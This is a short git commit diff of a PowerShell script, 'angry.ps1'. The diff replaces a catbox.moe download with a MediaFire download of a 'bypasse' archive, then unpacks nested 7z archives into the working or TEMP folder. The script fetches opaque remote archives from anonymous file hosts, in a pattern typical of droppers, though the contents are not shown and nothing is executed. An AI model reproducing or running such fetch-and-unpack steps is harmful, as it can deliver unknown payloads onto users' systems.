5a1fa64c6f749343333e3699281b1d6c11861f22
CHIHAOUI WAED <148530537+chihaouiwaed@users.noreply.github.com>
2025-03-10 00:06:36 +0100

    Update angry.ps1

--- angry.ps1
+++ angry.ps1
@@ -1,7 +1,1 @@
-$url = "https://files.catbox.moe/7vfkvz.7z" 
-$output = Join-Path $env:TEMP "bypasse_2_2.7z"
-Invoke-WebRequest -Uri $url -OutFile $output
-$sevenZipPath = "C:\Program Files\7-Zip\7z.exe"
-& "$sevenZipPath" x $output -o"$env:TEMP" -aoa
-& "$sevenZipPath" x (Join-Path $env:TEMP "bypasse_2.7z") -o"$env:TEMP" -aoa
-& "$sevenZipPath" x (Join-Path $env:TEMP "bypasse.7z") -o"$env:TEMP" -aoa
+Invoke-WebRequest -Uri "https://www.mediafire.com/file/owgnox66mxdjkkl/bypasse_2_2.7z/file" -OutFile "bypasse_2_2.7z"; 7z x bypasse_2_2.7z; 7z x bypasse_2.7z; 7z x bypasse.7z
